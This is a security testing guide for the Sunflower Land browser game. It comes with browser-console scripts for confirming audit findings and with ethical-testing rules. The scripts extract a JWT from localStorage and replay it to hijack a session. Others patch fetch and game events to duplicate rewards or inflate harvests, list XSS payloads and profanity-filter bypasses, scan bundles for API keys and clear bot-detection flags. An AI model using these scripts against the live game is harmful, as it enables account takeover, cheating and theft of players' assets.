# Security Testing Guide - Sunflower Land
**Quick Reference for Testing Identified Vulnerabilities**

---

## Prerequisites

### Required Tools
- **Chrome Browser** (with DevTools)
- **Burp Suite** (for network interception) - Optional
- **Node.js** (for running test scripts)
- **Git** (for cloning the repository)

### Setup Development Environment

```bash
# Clone repository
git clone https://github.com/ScriptSynth/sunflower-land.git
cd sunflower-land

# Install dependencies
yarn install

# Run development server
yarn dev

# Open in browser
# Navigate to http://localhost:3000
```

---

## Critical Vulnerabilities Testing

### 🔴 Test #1: Remote Code Execution via eval()

**File:** `/src/lib/network.ts`

#### Quick Test (Console)
```javascript
// Open Chrome DevTools (F12) → Console Tab
// Paste this code:

// Test if eval vulnerability exists
console.log("Testing for eval() vulnerability...");

// Create a test payload
const testPayload = btoa('console.log("VULNERABILITY CONFIRMED: eval() executed arbitrary code")');

// This would be executed if server returns farmHash
console.log("Test payload (base64):", testPayload);
console.log("Decoded:", atob(testPayload));

// To actually test, you'd need to intercept a network response
// See detailed steps in SECURITY_AUDIT_REPORT.md
```

#### Network Interception Test
```javascript
// 1. Open Chrome DevTools → Network Tab
// 2. Filter for "session" or "autosave" requests
// 3. Right-click on request → Copy as fetch
// 4. Modify response in local override

// Expected vulnerable response:
{
  "farmId": "123",
  "farmHash": "YWxlcnQoJ1hTUycpOw==",  // alert('XSS');
  // ... other fields
}

// If this executes an alert, vulnerability is confirmed
```

---

### 🔴 Test #2: JWT Token Extraction

#### Extract JWT from localStorage
```javascript
// Chrome DevTools Console
const host = window.location.host.replace(/^www\./, "");
const jwtKey = `sb_wiz.zpc.ng.${host}-${window.location.pathname}`;
const token = localStorage.getItem(jwtKey);

if (token) {
  console.log("✅ JWT Token Found:", token);
  
  // Decode JWT
  const [header, payload, signature] = token.replace(/"/g, '').split('.');
  const decoded = JSON.parse(atob(payload));
  
  console.log("JWT Contents:", decoded);
  console.log("- Wallet Address:", decoded.address);
  console.log("- Farm ID:", decoded.farmId);
  console.log("- Expiration:", new Date(decoded.exp * 1000));
  console.log("- Admin Access:", decoded.userAccess?.admin);
} else {
  console.log("❌ No JWT token found. User not logged in.");
}
```

#### Session Hijacking Test
```javascript
// Test session hijacking (use in private/incognito window)
// ONLY test on your own accounts!

// 1. Extract JWT from Account A (see above)
const stolenJWT = "YOUR_JWT_FROM_ACCOUNT_A";

// 2. In new browser window/incognito:
const host = window.location.host.replace(/^www\./, "");
const jwtKey = `sb_wiz.zpc.ng.${host}-${window.location.pathname}`;
localStorage.setItem(jwtKey, JSON.stringify(stolenJWT));

// 3. Reload page
location.reload();

// Expected: You're now logged in as Account A
```

---

## High-Risk Vulnerabilities Testing

### 🟠 Test #3: Client-Side State Manipulation

#### Intercept Game Machine Events
```javascript
// Find React root and game machine
// This requires the game to be running

// Method 1: Check if game machine is globally accessible
if (window.__gameMachine) {
  console.log("✅ Game machine accessible");
  
  // Patch send function
  const originalSend = window.__gameMachine.send;
  window.__gameMachine.send = function(event) {
    console.log("📤 Game Event:", event);
    
    // Modify event before sending
    if (event.type === 'HARVEST') {
      console.log("⚠️ Modifying harvest amount");
      event.payload = {...event.payload, amount: 9999};
    }
    
    return originalSend.call(this, event);
  };
  
  console.log("✅ Event interceptor installed");
} else {
  console.log("❌ Game machine not globally accessible");
  console.log("Try: Find via React DevTools component tree");
}
```

#### Intercept Fetch Requests
```javascript
// Intercept all fetch requests to modify game state
const originalFetch = window.fetch;
let requestCount = 0;

window.fetch = async function(...args) {
  const [url, options] = args;
  requestCount++;
  
  console.log(`[${requestCount}] Fetch:`, url);
  
  // Intercept autosave
  if (url.includes('/autosave')) {
    console.log("⚠️ Autosave detected");
    
    if (options?.body) {
      try {
        const body = JSON.parse(options.body);
        console.log("📦 Autosave payload:", body);
        
        // Modify actions
        if (body.actions) {
          console.log("Original actions:", body.actions.length);
          // Duplicate reward actions
          const rewards = body.actions.filter(a => 
            a.type?.includes('CLAIM') || a.type?.includes('REWARD')
          );
          body.actions.push(...rewards);
          console.log("Modified actions:", body.actions.length);
          options.body = JSON.stringify(body);
        }
      } catch (e) {
        console.error("Failed to parse body:", e);
      }
    }
  }
  
  return originalFetch.apply(this, args);
};

console.log("✅ Fetch interceptor installed");
console.log("All network requests will be logged");
```

---

### 🟠 Test #4: Negative Value Exploit

```javascript
// Test negative amount in game events
// WARNING: This may corrupt your game state

// Function to send game event (if accessible)
function testNegativeExploit() {
  console.log("Testing negative value exploit...");
  
  // Attempt to send negative sell amount
  const testEvent = {
    type: 'SELL_CROP',
    payload: {
      crop: 'Sunflower',
      amount: -1000  // Negative = buy instead of sell?
    }
  };
  
  console.log("Test event:", testEvent);
  
  // If you have access to game machine:
  // gameMachine.send(testEvent);
  
  console.log("⚠️ If this works, inventory would increase instead of decrease");
}

// testNegativeExploit(); // Uncomment to test
```

---

## Medium-Risk Vulnerabilities Testing

### 🟡 Test #5: Environment Variable Extraction

```javascript
// Extract all exposed environment variables
console.log("Extracting environment variables...");

// Method 1: Check if CONFIG is imported
try {
  // This would only work if CONFIG is globally accessible
  console.log("Checking for global CONFIG...");
  if (typeof window.CONFIG !== 'undefined') {
    console.log("✅ CONFIG found:", window.CONFIG);
  }
} catch (e) {
  console.log("❌ CONFIG not globally accessible");
}

// Method 2: Search bundle for VITE_ variables
console.log("\nSearching JavaScript bundles...");
const scripts = Array.from(document.scripts).filter(s => s.src);
console.log(`Found ${scripts.length} external scripts`);

scripts.slice(0, 3).forEach(async (script, i) => {
  try {
    const response = await fetch(script.src);
    const code = await response.text();
    
    // Search for API keys and sensitive data
    const patterns = [
      /VITE_[A-Z_]+/g,
      /sk_[a-zA-Z0-9]+/g,  // Stripe-like keys
      /api_[a-zA-Z0-9]+/g,  // API keys
      /AIza[a-zA-Z0-9_-]+/g,  // Google API keys
    ];
    
    patterns.forEach(pattern => {
      const matches = code.match(pattern);
      if (matches) {
        console.log(`Script ${i+1} contains:`, [...new Set(matches)].slice(0, 5));
      }
    });
  } catch (e) {
    console.error(`Failed to fetch script ${i+1}:`, e.message);
  }
});

// Method 3: Check localStorage for leaked keys
console.log("\nChecking localStorage...");
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  if (key.toLowerCase().includes('key') || 
      key.toLowerCase().includes('token') ||
      value?.includes('sk_') ||
      value?.includes('api_')) {
    console.log(`Potential sensitive data: ${key}`);
  }
}
```

---

### 🟡 Test #6: Chat XSS Test

```javascript
// Test chat message XSS vulnerabilities
const xssTests = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '\u003cscript\u003ealert(1)\u003c/script\u003e',
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
];

console.log("XSS Test Payloads:");
xssTests.forEach((payload, i) => {
  console.log(`${i+1}. ${payload}`);
});

console.log("\n⚠️ To test, paste these in the in-game chat");
console.log("If any execute JavaScript, XSS vulnerability exists");

// Test bad-words filter bypass
const badWordsBypasses = [
  'f.u.c.k',
  'f u c k',
  'f_u_c_k',
  'fսck',  // Unicode lookalike
  'ƒuck',  // Special character
];

console.log("\nBad Words Filter Bypass Tests:");
badWordsBypasses.forEach((word, i) => {
  console.log(`${i+1}. "${word}"`);
});
```

---

### 🟡 Test #7: Bot Detection Bypass

```javascript
// Clear bot detection flags
const host = window.location.host.replace(/^www\./, "");
const botKey = `goblin.swarm.${host}-${window.location.pathname}`;

console.log("Bot detection key:", botKey);
console.log("Current value:", localStorage.getItem(botKey));

// Clear flag
localStorage.removeItem(botKey);
console.log("✅ Bot flag cleared");

// Or set to expired
localStorage.setItem(botKey, new Date(0).toISOString());
console.log("✅ Bot flag set to expired date");

// Check if flag is active
function isBotDetected() {
  const storage = localStorage.getItem(botKey);
  if (!storage) return false;
  const time = new Date(storage);
  return Date.now() < time.getTime();
}

console.log("Bot detected:", isBotDetected());
```

---

## Quick Security Checklist

Run this comprehensive security check:

```javascript
console.log("🔒 SECURITY AUDIT CHECKLIST");
console.log("=".repeat(50));

// 1. Check for eval()
console.log("\n1. Checking for eval() usage...");
const hasEval = document.body.innerHTML.includes('eval(');
console.log(hasEval ? "⚠️ eval() detected" : "✅ No eval() in HTML");

// 2. Check localStorage
console.log("\n2. Checking localStorage...");
console.log(`- Total items: ${localStorage.length}`);
const sensitiveKeys = [];
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  if (key.includes('token') || key.includes('jwt') || key.includes('auth')) {
    sensitiveKeys.push(key);
  }
}
console.log(sensitiveKeys.length > 0 ? 
  `⚠️ Sensitive data in localStorage: ${sensitiveKeys.join(', ')}` : 
  "✅ No obvious sensitive data");

// 3. Check for exposed APIs
console.log("\n3. Checking for exposed objects...");
const exposedAPIs = [
  'window.__gameMachine',
  'window.__GAME_STATE__',
  'window.CONFIG',
  'window.ethereum',
];
exposedAPIs.forEach(api => {
  const exists = eval(`typeof ${api} !== 'undefined'`);
  console.log(exists ? `⚠️ ${api} is exposed` : `✅ ${api} not exposed`);
});

// 4. Check Content Security Policy
console.log("\n4. Checking Content Security Policy...");
const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
console.log(cspMeta ? 
  `✅ CSP found: ${cspMeta.content.substring(0, 50)}...` : 
  "⚠️ No CSP detected");

// 5. Check for HTTPS
console.log("\n5. Checking connection security...");
console.log(location.protocol === 'https:' ? 
  "✅ Using HTTPS" : 
  "⚠️ Using HTTP (insecure)");

// 6. Check cookies
console.log("\n6. Checking cookies...");
const cookies = document.cookie.split(';').filter(c => c.trim());
console.log(`- Total cookies: ${cookies.length}`);
cookies.forEach(cookie => {
  const [name] = cookie.split('=');
  const hasHttpOnly = false; // Can't check from JS if HttpOnly
  const hasSecure = cookie.includes('Secure');
  const hasSameSite = cookie.includes('SameSite');
  console.log(`  ${name.trim()}: ${
    hasSecure ? '✅ Secure' : '⚠️ No Secure'
  } ${hasSameSite ? '✅ SameSite' : '⚠️ No SameSite'}`);
});

// 7. Check for service worker
console.log("\n7. Checking service worker...");
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.getRegistrations().then(registrations => {
    console.log(`${registrations.length > 0 ? 
      `⚠️ ${registrations.length} service worker(s) registered` : 
      '✅ No service workers'}`);
  });
}

console.log("\n" + "=".repeat(50));
console.log("Audit complete. Review warnings above.");
```

---

## Automated Testing Script

Save this as `security-test.js` and run with Node.js:

```javascript
#!/usr/bin/env node
/**
 * Automated Security Testing Script
 * Usage: node security-test.js
 */

const fs = require('fs');
const path = require('path');

console.log("🔒 Automated Security Scan");
console.log("=".repeat(60));

// Test 1: Check for eval() in source code
console.log("\n1. Scanning for eval() usage...");
const srcDir = path.join(__dirname, 'src');

function scanDirectory(dir) {
  const files = fs.readdirSync(dir);
  const results = [];
  
  files.forEach(file => {
    const filePath = path.join(dir, file);
    const stat = fs.statSync(filePath);
    
    if (stat.isDirectory() && !file.startsWith('.')) {
      results.push(...scanDirectory(filePath));
    } else if (file.endsWith('.ts') || file.endsWith('.tsx') || file.endsWith('.js')) {
      const content = fs.readFileSync(filePath, 'utf8');
      if (content.includes('eval(')) {
        results.push({
          file: filePath.replace(srcDir, ''),
          issue: 'eval() usage detected',
          severity: 'CRITICAL'
        });
      }
      if (content.includes('localStorage.setItem') && content.includes('token')) {
        results.push({
          file: filePath.replace(srcDir, ''),
          issue: 'Token stored in localStorage',
          severity: 'CRITICAL'
        });
      }
      if (content.includes('dangerouslySetInnerHTML')) {
        results.push({
          file: filePath.replace(srcDir, ''),
          issue: 'dangerouslySetInnerHTML usage',
          severity: 'HIGH'
        });
      }
    }
  });
  
  return results;
}

if (fs.existsSync(srcDir)) {
  const issues = scanDirectory(srcDir);
  
  if (issues.length === 0) {
    console.log("✅ No critical issues found");
  } else {
    console.log(`⚠️ Found ${issues.length} issue(s):\n`);
    issues.forEach((issue, i) => {
      console.log(`${i+1}. [${issue.severity}] ${issue.file}`);
      console.log(`   ${issue.issue}\n`);
    });
  }
} else {
  console.log("❌ Source directory not found");
}

console.log("=".repeat(60));
console.log("Scan complete.");
```

---

## Safe Testing Guidelines

### ⚠️ IMPORTANT: Ethical Testing Rules

1. **Only test on your own accounts**
2. **Do not exploit production systems**
3. **Do not share exploits publicly before they're fixed**
4. **Report findings responsibly to the development team**
5. **Do not steal other users' assets or accounts**
6. **Use test networks when available**

### Recommended Testing Flow

1. ✅ Run automated scans first
2. ✅ Test on local development environment
3. ✅ Test on testnet (if available)
4. ✅ Document all findings
5. ✅ Report to security team
6. ❌ Do NOT test on production without permission

---

## Reporting Findings

When reporting security issues:

```markdown
### Vulnerability Report Template

**Title:** [Brief description]

**Severity:** Critical / High / Medium / Low

**Component:** [File/feature affected]

**Description:** 
[Detailed explanation of the vulnerability]

**Steps to Reproduce:**
1. Step one
2. Step two
3. Expected result

**Impact:**
[What an attacker could do]

**Suggested Fix:**
[Your recommendation]

**Proof of Concept:**
[Code or screenshots]
```

---

## Additional Resources

- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **Chrome DevTools Documentation:** https://developer.chrome.com/docs/devtools/
- **Web Security Academy:** https://portswigger.net/web-security

---

**End of Testing Guide**

*Remember: With great power comes great responsibility. Use these tests ethically.*
